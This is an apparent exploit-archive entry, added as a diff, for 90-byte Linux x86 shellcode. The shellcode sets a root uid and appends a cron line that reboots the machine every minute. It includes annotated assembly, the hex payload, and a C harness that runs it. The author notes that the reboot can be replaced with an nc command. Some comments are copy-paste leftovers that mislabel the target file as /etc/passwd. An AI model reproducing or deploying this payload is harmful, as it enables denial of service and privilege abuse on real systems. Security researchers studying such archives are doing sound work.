@@ -1,0 +1,88 @@
+id: 14238
+date: 09/28/2010
+title: linux/x86 setreuid(0,0) add reboot command each minutes 90 bytes
+author: xertux
+cves: 
+
+====================================================================================
+linux/x86 setreuid(0,0) and add reboot command each minutes in /etc/crontab 90 bytes
+====================================================================================
+
+#include <stdio.h>
+
+ /*
+  * Title : linux x86 shellcode setreuid(0, 0) and add reboot command each minutes in /etc/crontab, 90 bytes
+  * Author : xertux
+  * Platform: Linux X86
+  * Description : setuid(0) + open(/etc/crontab, e0x441, 0x180) + write(fd, * * * * * root reboot\n, 22) + close(fd)
+  * 			Add a line at /etc/crontab => * * * * * root reboot
+  *			Reboot the computer each minutes => An user hasn't the time to modify the /etc/crontab file
+  *			Dos Shellcode but we can replace reboot command by nc command or many other command...
+  * Size : 90 bytes
+  * */
+
+
+/*
+BITS 32
+
+;setresuid(0,0,0)
+xor eax, eax         ; eax become 0
+xor ebx, ebx         ; ebx become 0
+xor ecx, ecx         ; ecx become 0
+cdq                  ; edx become 0
+mov al, 0xa4         ; put call system 164 into eax
+int 0x80             ; execute setresuid(0,0,0)
+
+;open(/etc/crontab, e0x441, 0x180))
+push edx             ; null string termination
+push 0x6261746e      ; push "ntab"
+push 0x6f72632f      ; push "/cro"
+push 0x6374652f      ; push "/etc"
+mov ebx, esp         ; put "/etc//passwd" into ebx
+mov WORD cx, 0x441   ; put the O_WRONLY | O_APPEND | O_CREATE argument
+mov WORD dx, 0x180   ; put the S_IRUSR | S_IWUSR argument
+push BYTE 0x5        ; put call system open on the stack
+pop eax              ; get the system call number and insert into eax
+int 0x80             ; execute open(/etc//passwd, O_WRONLY | O_APPEND, S_IRUSR | S_IWUSR)
+
+;write(fd, "* * * * * root reboot\n", 22) ==> pass "toor"
+mov ebx, eax         ; put the file descriptor return by open into ebx
+xor eax, eax         ; eax become 0
+push eax             ; null termination string
+push WORD 0x0a74     ; push "t\n"
+push 0x6f6f6265      ; push "eboo"
+push 0x7220746f      ; push "ot r"
+push 0x6f72202a      ; push "* ro"
+push 0x202a202a      ; push "* * "
+push 0x202a202a      ; push "* * "
+mov ecx, esp         ; put "* * * * * root reboot\n" into ebx
+push BYTE 22         ; put the size of line written on the stack
+pop edx              ; get the size into edx
+mov al, 0x4          ; put the call system write into eax
+int 0x80             ; execute write(fd, * * * * * root reboot\n", 22)
+
+;close(fd)
+push BYTE 0x6        ; put the call system close on the stack
+pop eax              ; put the call system number into eax
+int 0x80             ; execute close(fd)
+
+*/
+
+char shellcode[] =
+"\x31\xc0\x31\xdb\x31\xc9\x99\xb0\xa4\xcd\x80\x52\x68\x6e\x74\x61"
+"\x62\x68\x2f\x63\x72\x6f\x68\x2f\x65\x74\x63\x89\xe3\x66\xb9\x41"
+"\x04\x66\xba\x80\x01\x6a\x05\x58\xcd\x80\x89\xc3\x31\xc0\x50\x66"
+"\x68\x74\x0a\x68\x65\x62\x6f\x6f\x68\x6f\x74\x20\x72\x68\x2a\x20"
+"\x72\x6f\x68\x2a\x20\x2a\x20\x68\x2a\x20\x2a\x20\x89\xe1\x6a\x16"
+"\x5a\xb0\x04\xcd\x80\x6a\x06\x58\xcd\x80";
+
+int main()
+{
+	printf("[*] Shellcode - length: %d\n", strlen(shellcode));
+	(*(void(*)())shellcode)();
+	return 0;
+}
+
+
+
+#  0day.today [2023-03-23]  #
